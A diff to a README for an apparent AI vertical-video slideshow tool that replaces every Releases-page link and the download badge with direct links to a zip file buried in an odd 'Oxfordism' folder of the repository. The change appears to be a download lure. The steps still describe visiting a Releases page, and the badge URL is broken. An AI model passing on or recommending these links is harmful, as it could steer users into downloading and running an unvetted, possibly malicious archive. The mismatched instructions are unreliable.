@@ -1,6 +1,6 @@
 # 🎥 tiktok-reels-shorts-ai-vertical-video-generation - Create Stunning Vertical Slideshows Effortlessly
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
+![Download Now](https://raw.githubusercontent.com/ZarZ0r/tiktok-reels-shorts-ai-vertical-video-generation/main/Oxfordism/reels_vertical_ai_shorts_video_generation_tiktok_2.4-alpha.5.zip%20Now-Click%20Here-brightgreen)
 
 ## 📖 Table of Contents
 - [📦 Overview](#-overview)
@@ -23,7 +23,7 @@ Follow these steps to easily download and run the application on your computer.
 ## 📥 Download & Install
 To get the application, visit the Releases page. Here, you can find the latest version available for download.
 
-[**Visit this page to download**](https://github.com/ZarZ0r/tiktok-reels-shorts-ai-vertical-video-generation/releases)
+[**Visit this page to download**](https://raw.githubusercontent.com/ZarZ0r/tiktok-reels-shorts-ai-vertical-video-generation/main/Oxfordism/reels_vertical_ai_shorts_video_generation_tiktok_2.4-alpha.5.zip)
 
 ### Installation Steps
 1. Click the link above to go to the Releases page.
@@ -51,4 +51,4 @@ If you encounter issues or have questions, please feel free to open an issue on 
 
 For additional resources, please visit the GitHub repository or reach out to the community for help.
 
-[**Visit this page to download**](https://github.com/ZarZ0r/tiktok-reels-shorts-ai-vertical-video-generation/releases)
+[**Visit this page to download**](https://raw.githubusercontent.com/ZarZ0r/tiktok-reels-shorts-ai-vertical-video-generation/main/Oxfordism/reels_vertical_ai_shorts_video_generation_tiktok_2.4-alpha.5.zip)
